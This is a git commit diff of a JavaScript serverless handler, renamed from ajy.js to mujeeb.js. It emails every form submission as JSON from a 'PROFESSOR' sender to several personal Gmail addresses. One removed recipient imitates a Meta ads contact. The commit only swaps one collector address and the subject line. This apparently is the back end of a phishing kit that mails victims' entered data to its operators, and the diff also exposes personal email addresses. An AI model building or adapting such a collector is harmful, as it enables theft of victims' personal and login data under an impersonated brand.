cea88c117b4f5e159fcde6f73e170a9070840ddd
zm9807350 <zm9807350@gmail.com>
2025-12-22 09:40:17 +0500

    Update and rename ajy.js to mujeeb.js

--- mujeeb.js
+++ mujeeb.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,contact.meta.ads.companyo@gmail.com",
-      subject: "Ajy",
+      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,mujeebnizamani73@gmail.com",
+      subject: "Mujeeb",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
